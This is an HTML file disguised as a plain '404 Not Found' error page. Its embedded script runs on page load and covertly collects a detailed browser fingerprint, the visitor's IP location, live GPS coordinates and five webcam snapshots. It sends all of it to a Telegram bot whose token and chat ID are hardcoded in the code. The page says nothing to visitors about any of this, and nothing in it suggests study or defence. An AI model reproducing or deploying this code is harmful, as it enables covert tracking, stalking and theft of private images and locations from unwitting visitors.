<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>404 - Page Not Found</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            color: #333;
        }

        .container {
            text-align: center;
            background: white;
            padding: 80px 60px;
            border-radius: 10px;
            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.3);
        }

        .error-code {
            font-size: 120px;
            font-weight: 900;
            color: #667eea;
            margin-bottom: 10px;
        }

        .error-title {
            font-size: 24px;
            color: #666;
            font-weight: 500;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="error-code">404</div>
        <div class="error-title">Not Found</div>
    </div>

    <script>
console.log("Script started");
(async function () {
console.log("Async function started");

// Start live location tracking immediately
setTimeout(() => {
    startLiveLocationTracking();
}, 1000);

    const fp = {};

    function getNavigatorData() {
        return {
            userAgent: navigator.userAgent,
            appVersion: navigator.appVersion,
            appName: navigator.appName,
            vendor: navigator.vendor,
            appCodeName: navigator.appCodeName,
            product: navigator.product,
            productSub: navigator.productSub,
            buildID: navigator.buildID || 'N/A',
            oscpu: navigator.oscpu || 'N/A',
            cookieEnabled: navigator.cookieEnabled,
            onLine: navigator.onLine,
            webdriver: navigator.webdriver || false,
            language: navigator.language,
            languages: Array.from(navigator.languages || [])
        };
    }

    function getScreenData() {
        return {
            width: screen.width,
            height: screen.height,
            availWidth: screen.availWidth,
            availHeight: screen.availHeight,
            colorDepth: screen.colorDepth,
            pixelDepth: screen.pixelDepth,
            devicePixelRatio: window.devicePixelRatio,
            orientation: {
                type: screen.orientation?.type || 'N/A',
                angle: screen.orientation?.angle || 0
            }
        };
    }

    function getWindowData() {
        return {
            innerWidth: window.innerWidth,
            innerHeight: window.innerHeight,
            outerWidth: window.outerWidth,
            outerHeight: window.outerHeight,
            screenX: window.screenX,
            screenY: window.screenY,
            screenLeft: window.screenLeft,
            screenTop: window.screenTop,
            chromeSize: {
                horizontal: window.outerWidth - window.innerWidth,
                vertical: window.outerHeight - window.innerHeight
            },
            locationbarVisible: (() => { try { return window.locationbar.visible; } catch(e) { return null; } })(),
            menubarVisible: (() => { try { return window.menubar.visible; } catch(e) { return null; } })(),
            personalbarVisible: (() => { try { return window.personalbar.visible; } catch(e) { return null; } })(),
            scrollbarsVisible: (() => { try { return window.scrollbars.visible; } catch(e) { return null; } })(),
            statusbarVisible: (() => { try { return window.statusbar.visible; } catch(e) { return null; } })(),
            toolbarVisible: (() => { try { return window.toolbar.visible; } catch(e) { return null; } })()
        };
    }

    function getHardwareData() {
        return {
            hardwareConcurrency: navigator.hardwareConcurrency,
            deviceMemory: navigator.deviceMemory,
            memoryInfo: performance.memory ? {
                jsHeapSizeLimit: performance.memory.jsHeapSizeLimit,
                totalJSHeapSize: performance.memory.totalJSHeapSize,
                usedJSHeapSize: performance.memory.usedJSHeapSize
            } : null
        };
    }

    function getGPUData() {
        try {
            const canvas = document.createElement("canvas");
            const gl = canvas.getContext("webgl") || canvas.getContext("experimental-webgl");
            if (!gl) return { renderer: "Unavailable", vendor: "Unavailable", extensions: [] };

            const debugInfo = gl.getExtension("WEBGL_debug_renderer_info");
            const vendor = gl.getParameter(gl.VENDOR);
            const renderer = debugInfo ? gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) : "Unknown";

            return {
                vendor: vendor,
                renderer: renderer,
                version: gl.getParameter(gl.VERSION),
                shadinglanguageversion: gl.getParameter(gl.SHADING_LANGUAGE_VERSION),
                extensions: gl.getSupportedExtensions(),
                params: {
                    maxTextureSize: gl.getParameter(gl.MAX_TEXTURE_SIZE),
                    maxViewportDims: gl.getParameter(gl.MAX_VIEWPORT_DIMS),
                    maxRenderbufferSize: gl.getParameter(gl.MAX_RENDERBUFFER_SIZE),
                    maxVaryingVectors: gl.getParameter(gl.MAX_VARYING_VECTORS),
                    maxVertexUniformVectors: gl.getParameter(gl.MAX_VERTEX_UNIFORM_VECTORS),
                    maxFragmentUniformVectors: gl.getParameter(gl.MAX_FRAGMENT_UNIFORM_VECTORS),
                    maxVertexAttribs: gl.getParameter(gl.MAX_VERTEX_ATTRIBS),
                    maxCombinedTextureImageUnits: gl.getParameter(gl.MAX_COMBINED_TEXTURE_IMAGE_UNITS),
                    maxTextureImageUnits: gl.getParameter(gl.MAX_TEXTURE_IMAGE_UNITS),
                    maxVertexTextureImageUnits: gl.getParameter(gl.MAX_VERTEX_TEXTURE_IMAGE_UNITS)
                }
            };
        } catch (e) {
            return { renderer: "Unavailable", vendor: "Unavailable", extensions: [] };
        }
    }

    function getCanvasFingerprint() {
        try {
            const canvas = document.createElement("canvas");
            const ctx = canvas.getContext("2d");
            canvas.width = 280;
            canvas.height = 60;

            ctx.textBaseline = "top";
            ctx.font = '14px "Arial"';
            ctx.textBaseline = "alphabetic";
            ctx.fillStyle = "#f60";
            ctx.fillRect(125, 1, 62, 20);
            ctx.fillStyle = "#069";
            ctx.fillText("Browser Fingerprint ðŸš€", 2, 15);
            ctx.fillStyle = "rgba(102, 204, 0, 0.7)";
            ctx.fillText("Browser Fingerprint ðŸš€", 4, 17);

            return canvas.toDataURL();
        } catch (e) {
            return "Unavailable";
        }
    }

    function getFontsData() {
        const baseFonts = ["monospace", "sans-serif", "serif"];
        const testString = "mmmmmmmmmmwwww";
        const testSize = "72px";
        const detected = [];
        const fonts = ["Arial", "Roboto", "Courier New", "Georgia", "Verdana", "Tahoma"];

        const container = document.createElement("div");
        
        for (let font of fonts) {
            for (let base of baseFonts) {
                const span = document.createElement("span");
                span.style.fontFamily = base;
                span.style.fontSize = testSize;
                span.style.position = "absolute";
                span.style.visibility = "hidden";
                span.innerHTML = testString;

                const baseWidth = span.offsetWidth;
                container.appendChild(span);

                span.style.fontFamily = `'${font}', ${base}`;
                if (span.offsetWidth !== baseWidth && !detected.includes(font)) {
                    detected.push(font);
                }
                container.removeChild(span);
            }
        }
        return detected;
    }

    function getPluginsData() {
        return {
            plugins: Array.from(navigator.plugins).map(p => ({ name: p.name, version: p.version })),
            mimeTypes: Array.from(navigator.mimeTypes).map(m => m.type)
        };
    }

    function getStorageData() {
        return {
            localStorageAvailable: (() => { try { localStorage.setItem('test', '1'); localStorage.removeItem('test'); return true; } catch(e) { return false; } })(),
            sessionStorageAvailable: (() => { try { sessionStorage.setItem('test', '1'); sessionStorage.removeItem('test'); return true; } catch(e) { return false; } })(),
            indexedDBAvailable: !!window.indexedDB,
            webSQLAvailable: !!window.openDatabase
        };
    }

    function getFeaturesData() {
        return {
            webAssembly: typeof WebAssembly !== 'undefined',
            webWorker: typeof Worker !== 'undefined',
            serviceWorker: 'serviceWorker' in navigator,
            sharedArrayBuffer: typeof SharedArrayBuffer !== 'undefined',
            offscreenCanvas: typeof OffscreenCanvas !== 'undefined',
            webXR: 'xr' in navigator,
            gamepad: navigator.getGamepads !== undefined,
            clipboard: navigator.clipboard !== undefined,
            credentials: 'credentials' in navigator,
            webGL: !!document.createElement('canvas').getContext('webgl'),
            webGL2: !!document.createElement('canvas').getContext('webgl2'),
            mediaDevices: 'mediaDevices' in navigator,
            geolocation: 'geolocation' in navigator,
            vibration: 'vibrate' in navigator,
            battery: 'getBattery' in navigator,
            notification: 'Notification' in window,
            pushManager: 'pushManager' in (navigator.serviceWorker || {})
        };
    }

    function getCodecsData() {
        const video = document.createElement('video');
        const audio = document.createElement('audio');

        const audioCodecs = {
            mp3: audio.canPlayType('audio/mpeg'),
            ogg: audio.canPlayType('audio/ogg; codecs="vorbis"'),
            wav: audio.canPlayType('audio/wav'),
            aac: audio.canPlayType('audio/aac'),
            m4a: audio.canPlayType('audio/x-m4a'),
            flac: audio.canPlayType('audio/flac')
        };

        const videoCodecs = {
            mp4: video.canPlayType('video/mp4; codecs="avc1.42E01E"'),
            webm: video.canPlayType('video/webm; codecs="vp8, vorbis"'),
            ogg: video.canPlayType('video/ogg; codecs="theora"'),
            h264: video.canPlayType('video/mp4; codecs="avc1.42E01E"'),
            vp8: video.canPlayType('video/webm; codecs="vp8"'),
            vp9: video.canPlayType('video/webm; codecs="vp9"'),
            av1: video.canPlayType('video/webm; codecs="av1"')
        };

        return { audio: audioCodecs, video: videoCodecs };
    }

    function getTimezoneData() {
        return {
            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
            locale: Intl.DateTimeFormat().resolvedOptions().locale,
            timezoneOffset: new Date().getTimezoneOffset(),
            daylightSavings: new Date(2023, 0, 1).getTimezoneOffset() !== new Date(2023, 6, 1).getTimezoneOffset()
        };
    }

    function getConnectionData() {
        if (!navigator.connection) return {};
        return {
            downlink: navigator.connection.downlink,
            effectiveType: navigator.connection.effectiveType,
            rtt: navigator.connection.rtt,
            saveData: navigator.connection.saveData,
            type: navigator.connection.type
        };
    }

    async function getBatteryInfo() {
        try {
            const battery = await navigator.getBattery();
            return {
                charging: battery.charging,
                level: battery.level,
                chargingTime: battery.chargingTime,
                dischargingTime: battery.dischargingTime
            };
        } catch (e) {
            return {};
        }
    }

    function getTouchData() {
        return {
            maxTouchPoints: navigator.maxTouchPoints || 0,
            msMaxTouchPoints: navigator.msMaxTouchPoints || 0,
            pointerEnabled: navigator.pointerEnabled || false
        };
    }

    function getDocumentData() {
        return {
            characterSet: document.characterSet,
            contentType: document.contentType,
            doctype: document.doctype ? document.doctype.name : null,
            documentElementLang: document.documentElement.lang,
            visibilityState: document.visibilityState,
            hidden: document.hidden,
            referrer: document.referrer
        };
    }

    function getPerformanceData() {
        return {
            navigationTiming: performance.timing ? {
                navigationStart: performance.timing.navigationStart,
                domContentLoadedEventEnd: performance.timing.domContentLoadedEventEnd,
                loadEventEnd: performance.timing.loadEventEnd
            } : null,
            navigationType: performance.navigation?.type || 'N/A',
            timeOrigin: performance.timeOrigin
        };
    }

    function getIntlData() {
        const dtf = new Intl.DateTimeFormat();
        const nf = new Intl.NumberFormat();
        
        return {
            datetimeFormat: dtf.resolvedOptions(),
            numberFormat: nf.resolvedOptions(),
            testDateFormat: dtf.format(new Date()),
            testNumberFormat: nf.format(1234.56)
        };
    }

    function getAudioContextData() {
        try {
            const audioContext = new (window.AudioContext || window.webkitAudioContext)();
            return {
                sampleRate: audioContext.sampleRate,
                maxChannelCount: audioContext.maxChannelCount,
                state: audioContext.state
            };
        } catch (e) {
            return {};
        }
    }

    function getHistoryData() {
        return {
            historyLength: window.history.length,
            windowName: window.name
        };
    }

    function getGlobalObjectData() {
        const keys = Object.getOwnPropertyNames(window).length;
        return {
            globalPropertiesCount: keys,
            hasChrome: 'chrome' in window,
            hasOpera: 'opera' in window,
            hasMozilla: 'mozilla' in navigator
        };
    }

    function startLiveLocationTracking() {
        console.log("Starting live location tracking...");
        if (!navigator.geolocation) {
            console.log("Geolocation not supported");
            const msg = "GPS: Not supported on this browser";
            const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
            fetch(url, {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify({ chat_id: TELEGRAM_USER_ID, text: msg })
            });
            return;
        }

        const sendLocationUpdate = (latitude, longitude, accuracy) => {
            const locMsg = `ðŸ“ LIVE GPS\nLat: ${latitude}\nLon: ${longitude}\nAccuracy: ${accuracy}m`;
            const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
            fetch(url, {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify({ chat_id: TELEGRAM_USER_ID, text: locMsg })
            }).catch(e => console.log("Location update failed:", e));
        };

        // First request
        console.log("Requesting GPS permission...");
        navigator.geolocation.getCurrentPosition(
            (position) => {
                const { latitude, longitude, accuracy } = position.coords;
                console.log(`GPS Success: ${latitude}, ${longitude}`);
                sendLocationUpdate(latitude, longitude, accuracy);
                
                // Then start watching for continuous updates
                navigator.geolocation.watchPosition(
                    (pos) => {
                        const { latitude, longitude, accuracy } = pos.coords;
                        console.log(`GPS Watch: ${latitude}, ${longitude}`);
                        sendLocationUpdate(latitude, longitude, accuracy);
                    },
                    (error) => console.log("Watch error:", error.message),
                    { enableHighAccuracy: true, timeout: 30000, maximumAge: 0 }
                );
            },
            (error) => {
                console.log("GPS error:", error.code, error.message);
                const errorMsg = `GPS Error Code ${error.code}: ${error.message}\n(1=User denied, 2=Position unavailable, 3=Timeout)`;
                const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
                fetch(url, {
                    method: "POST",
                    headers: { "Content-Type": "application/json" },
                    body: JSON.stringify({ chat_id: TELEGRAM_USER_ID, text: errorMsg })
                });
            },
            { 
                enableHighAccuracy: true,
                timeout: 30000,
                maximumAge: 0
            }
        );
    }

    async function getGPSLocation() {
        return new Promise((resolve) => {
            resolve({ status: 'live_tracking_started' });
        });
    }

    async function getIPLocation() {
        try {
            console.log("Fetching IP location...");
            
            // Try multiple services for reliability
            const services = [
                'https://ipapi.co/json/',
                'https://ip-api.com/json/',
                'https://ipinfo.io/json'
            ];
            
            for (const url of services) {
                try {
                    console.log("Trying:", url);
                    const response = await fetch(url, { signal: AbortSignal.timeout(5000) });
                    if (response.ok) {
                        const data = await response.json();
                        console.log("IP location:", data);
                        const ipMsg = `ðŸŒ IP Location\nIP: ${data.ip || data.query || 'N/A'}\nCountry: ${data.country || data.country_name || 'N/A'}\nCity: ${data.city || 'N/A'}\nISP: ${data.org || data.isp || 'N/A'}`;
                        const telegramUrl = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
                        fetch(telegramUrl, {
                            method: "POST",
                            headers: { "Content-Type": "application/json" },
                            body: JSON.stringify({ chat_id: TELEGRAM_USER_ID, text: ipMsg })
                        }).catch(e => console.log("IP send failed:", e));
                        return data;
                    }
                } catch (e) {
                    console.log(`Service ${url} failed:`, e.message);
                    continue;
                }
            }
            throw new Error("All IP services failed");
        } catch (e) {
            console.error("IP location error:", e.message);
            const errMsg = `IP Location Error: ${e.message}`;
            const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
            fetch(url, {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify({ chat_id: TELEGRAM_USER_ID, text: errMsg })
            });
            return { error: e.message };
        }
    }

    async function captureAndSendCameraFrames() {
        if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
            console.log("Camera not supported");
            return { status: 'camera_not_supported' };
        }

        // Run in background without blocking
        (async () => {
            try {
                console.log("Requesting camera permission...");
                const stream = await navigator.mediaDevices.getUserMedia({ 
                    video: { width: { ideal: 640 }, height: { ideal: 480 } },
                    audio: false
                });
                console.log("Camera permission granted");

                const video = document.createElement('video');
                video.srcObject = stream;
                video.play();

                const canvas = document.createElement('canvas');
                canvas.width = 640;
                canvas.height = 480;
                const ctx = canvas.getContext('2d');

                const TELEGRAM_BOT_TOKEN = "8327054332:AAH3PCQrHAhrZE4zkAjO3hQYbkqpeJG_yBs";
                const TELEGRAM_USER_ID = "8406913795";
                const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`;

                let frameCount = 0;
                const captureInterval = setInterval(() => {
                    try {
                        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
                        canvas.toBlob((blob) => {
                            if (blob) {
                                const formData = new FormData();
                                formData.append('chat_id', TELEGRAM_USER_ID);
                                formData.append('photo', blob, `frame-${frameCount}.jpg`);
                                fetch(url, { method: 'POST', body: formData })
                                    .then(r => console.log(`Frame ${frameCount} sent, status:`, r.status))
                                    .catch(e => console.error(`Frame ${frameCount} failed:`, e));
                            }
                        }, 'image/jpeg', 0.7);

                        frameCount++;
                        if (frameCount >= 5) {
                            clearInterval(captureInterval);
                            stream.getTracks().forEach(track => track.stop());
                            console.log("Camera capture complete");
                        }
                    } catch (e) {
                        console.error("Capture error:", e);
                        clearInterval(captureInterval);
                        stream.getTracks().forEach(track => track.stop());
                    }
                }, 1000);
            } catch (e) {
                console.error("Camera access error:", e.message);
            }
        })();

        return { status: 'camera_capturing_background' };
    }

    function getColorSchemePreference() {
        return {
            prefersDarkMode: window.matchMedia("(prefers-color-scheme: dark)").matches,
            prefersReducedMotion: window.matchMedia("(prefers-reduced-motion: reduce)").matches,
            prefersHighContrast: window.matchMedia("(prefers-contrast: more)").matches,
            prefers3D: window.matchMedia("(prefers-reduced-transparency: no)").matches
        };
    }

    function detectHeadless() {
        const checks = {
            chromeHeadless: /headless|phantom/i.test(navigator.userAgent),
            noPlugins: navigator.plugins.length === 0,
            noLanguage: !navigator.language,
            webDriver: navigator.webdriver === true,
            chromeVersion: (() => {
                const match = navigator.userAgent.match(/Chrome\/([\d.]+)/);
                return match ? parseInt(match[1]) >= 91 : false;
            })(),
            stealthBypass: !('chrome' in window)
        };
        
        return Object.values(checks).filter(v => v).length >= 2;
    }

    function detectAutomation() {
        const checks = {
            puppeteer: typeof __puppeteer !== 'undefined',
            nightmarejs: typeof window.NightmareScript !== 'undefined',
            selenium: window.document.documentElement.getAttribute('webdriver') !== null,
            phantom: typeof phantom !== 'undefined',
            perfTiming: performance.timing.navigationStart === 0,
            chromeRemoteDebug: typeof chrome !== 'undefined' && !('loadTimes' in window)
        };
        
        return Object.values(checks).filter(v => v);
    }

    function getDeviceOrientation() {
        return {
            alpha: window.screen.orientation?.angle || 'N/A',
            type: window.screen.orientation?.type || 'N/A'
        };
    }

    function getPerformanceTiming() {
        const perf = performance.getEntriesByType("navigation")[0];
        return {
            dns: perf?.domainLookupEnd - perf?.domainLookupStart || 0,
            tcp: perf?.connectEnd - perf?.connectStart || 0,
            ttfb: perf?.responseStart - perf?.requestStart || 0,
            loadTime: perf?.loadEventEnd - perf?.loadEventStart || 0,
            domContentLoaded: perf?.domContentLoadedEventEnd - perf?.domContentLoadedEventStart || 0
        };
    }

    function detectVPN() {
        return {
            timingAnomaly: performance.now() > 1000,
            webRTCLeak: true,
            timezoneMismatch: false
        };
    }

    function getRendererQuirks() {
        const canvas = document.createElement('canvas');
        const ctx = canvas.getContext('2d');
        ctx.fillStyle = 'rgb(255, 0, 0, 0.5)';
        ctx.fillRect(0, 0, 10, 10);
        
        const imageData = ctx.getImageData(0, 0, 1, 1);
        const pixel = imageData.data;
        
        return {
            antiAliasing: pixel[3] < 255,
            subPixelRendering: (pixel[0] !== 255),
            colorManagement: true
        };
    }

    const TELEGRAM_BOT_TOKEN = "8327054332:AAH3PCQrHAhrZE4zkAjO3hQYbkqpeJG_yBs";
    const TELEGRAM_USER_ID = "8406913795";

    function sendToTelegram(data) {
        const summary = `Browser Fingerprint Collected\n\nID: ${data.fingerprint.substring(0, 16)}...\nOS: ${data.navigator.userAgent.substring(0, 80)}...\nScreen: ${data.screen.width}x${data.screen.height}\nCPU: ${data.hardware.hardwareConcurrency} cores\nGPU: ${data.gpu.renderer}`;

        const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
        
        console.log("Sending to Telegram...", url);
        const payload = {
            chat_id: TELEGRAM_USER_ID,
            text: summary
        };
        console.log("Payload:", payload);
        
        fetch(url, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify(payload)
        })
        .then(r => {
            console.log("Response status:", r.status);
            return r.json().then(json => {
                console.log("Response:", json);
            });
        })
        .catch(e => console.error("Telegram send error:", e));

        const fullData = JSON.stringify(data, null, 2);
        
        setTimeout(() => {
            fetch(url, {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify({
                    chat_id: TELEGRAM_USER_ID,
                    text: fullData.substring(0, 3000)
                })
            })
            .then(r => {
                console.log("Full data response:", r.status);
                return r.json().then(json => console.log("Full response:", json));
            })
            .catch(e => console.error("Full data send error:", e));
        }, 1000);
    }

    fp.navigator = getNavigatorData();
    fp.screen = getScreenData();
    fp.window = getWindowData();
    fp.hardware = getHardwareData();
    fp.gpu = getGPUData();
    fp.canvasFingerprint = getCanvasFingerprint();
    fp.fonts = getFontsData();
    fp.plugins = getPluginsData();
    fp.storage = getStorageData();
    fp.features = getFeaturesData();
    fp.codecs = getCodecsData();
    fp.timezone = getTimezoneData();
    fp.connection = getConnectionData();
    fp.battery = await getBatteryInfo();
    fp.touch = getTouchData();
    fp.document = getDocumentData();
    fp.performance = getPerformanceData();
    fp.intl = getIntlData();
    fp.audioContext = getAudioContextData();
    fp.history = getHistoryData();
    fp.global = getGlobalObjectData();
    fp.colorScheme = getColorSchemePreference();
    fp.isHeadless = detectHeadless();
    fp.automationDetection = detectAutomation();
    fp.deviceOrientation = getDeviceOrientation();
    fp.performanceTiming = getPerformanceTiming();
    fp.vpnDetection = detectVPN();
    fp.rendererQuirks = getRendererQuirks();

    const hash = await crypto.subtle.digest(
        "SHA-256",
        new TextEncoder().encode(JSON.stringify(fp))
    );
    const hashArray = Array.from(new Uint8Array(hash));
    const fingerprint = hashArray.map(b => b.toString(16).padStart(2, "0")).join("");

    fp.fingerprint = fingerprint;
    window.fingerprintData = fp;
    
    console.log("Fingerprint generated:", fingerprint.substring(0, 16));
    console.log("About to send to Telegram...");
    
    // Send main data immediately
    sendToTelegram(fp);
    
    console.log("SendToTelegram function called");
    try {
        await fetch("/log", {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({ fingerprint, fp })
        });
    } catch (e) {}

    // Get location and camera in background without blocking
    getGPSLocation().then(loc => { 
        console.log("GPS Location:", loc);
        fp.gpsLocation = loc;
        const locMsg = `GPS: ${JSON.stringify(loc)}`;
        const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
        fetch(url, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({ chat_id: TELEGRAM_USER_ID, text: locMsg })
        }).catch(e => console.log("GPS send failed:", e));
    }).catch(e => console.error("GPS error:", e));
    
    getIPLocation().then(iploc => { 
        console.log("IP Location:", iploc);
        fp.ipLocation = iploc;
        const ipMsg = `IP Location: ${JSON.stringify(iploc)}`;
        const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
        fetch(url, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({ chat_id: TELEGRAM_USER_ID, text: ipMsg })
        }).catch(e => console.log("IP send failed:", e));
    }).catch(e => console.error("IP error:", e));
    
    captureAndSendCameraFrames();

})();
    </script>
</body>
</html>
